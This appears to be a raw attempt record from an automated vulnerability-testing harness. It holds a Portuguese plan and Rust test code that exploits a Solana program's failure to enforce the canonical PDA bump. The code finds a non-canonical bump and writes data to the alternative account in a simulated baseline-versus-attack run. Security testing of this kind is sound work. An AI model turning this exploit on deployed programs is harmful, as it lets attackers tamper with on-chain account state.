attempts.raw:
{
  "plan": "Preparo uma conta de dados no PDA canonico derivado de [b"data", user, bump_canonico] e uma conta de usuario. O baseline chama set_value com o bump canonico e o PDA canonico, gravando o valor. O ataque chama set_value com um bump nao-canonico (menor que o canonico) e a conta de dados no endereco alternativo correspondente, mantendo a mesma seed logica. O efeito medido e que a conta alternativa foi aceita e teve seus dados alterados, demonstrando que o programa aceitou um PDA nao-canonico.",
  "scenario": "let user = Pubkey::new_unique();

// Encontra o bump canonico e o PDA canonico
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Procura um bump nao-canonico (menor que o canonico) que ainda produza um endereco valido
let mut alt_bump: u8 = 0;
let mut alt_pda = Pubkey::default();
let mut found = false;
let mut b = canonical_bump.wrapping_sub(1);
loop {
    if let Ok(pda) = Pubkey::create_program_address(&[b"data", user.as_ref(), &[b]], &env.program_id) {
        alt_bump = b;
        alt_pda = pda;
        found = true;
        break;
    }
    if b == 0 {
        break;
    }
    b -= 1;
}

// Conta de dados canonica (ja existente, dona do programa)
let canonical_data = account(&env.program_id, &[0u8; 49], None);

// Conta de dados alternativa (mesmo layout, dona do programa)
let alt_data = account(&env.program_id, &[0u8; 49], None);

// Conta do usuario (signer)
let user_account = wallet(1_000_000_000);

// Baseline: usa o PDA canonico e o bump canonico
let mut baseline_ix_data = Vec::with_capacity(10);
baseline_ix_data.push(0u8); // IX_SET_VALUE
baseline_ix_data.push(canonical_bump);
baseline_ix_data.extend_from_slice(&42u64.to_le_bytes());

let baseline_ix = env.raw_ix(
    &baseline_ix_data,
    &[
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);

let baseline_accounts = [
    (canonical_pda, canonical_data),
    (user, user_account.clone()),
];

let baseline_result = env.baseline(
    "set_value com bump canonico e PDA canonico",
    &baseline_ix,
    &baseline_accounts,
);

// Ataque: usa o PDA alternativo e o bump nao-canonico
let mut attack_ix_data = Vec::with_capacity(10);
attack_ix_data.push(0u8); // IX_SET_VALUE
attack_ix_data.push(alt_bump);
attack_ix_data.extend_from_slice(&99u64.to_le_bytes());

let attack_ix = env.raw_ix(
    &attack_ix_data,
    &[
        AccountMeta::new(alt_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);

let attack_accounts = [
    (alt_pda, alt_data),
    (user, user_account),
];

let attack_result = env.attack(
    "set_value com bump nao-canonico e PDA alternativo",
    &attack_ix,
    &attack_accounts,
);

if attack_result.program_result == ProgramResult::Success {
    let data_after = after(&attack_result, &alt_pda).data();
    let stored_value = read_u64(data_after, 40);
    let stored_bump = data_after[48];
    env.effect(
        "PDA nao-canonico aceito e dados gravados",
        stored_value == 99 && stored_bump == alt_bump && alt_pda != canonical_pda,
    );
}"
}

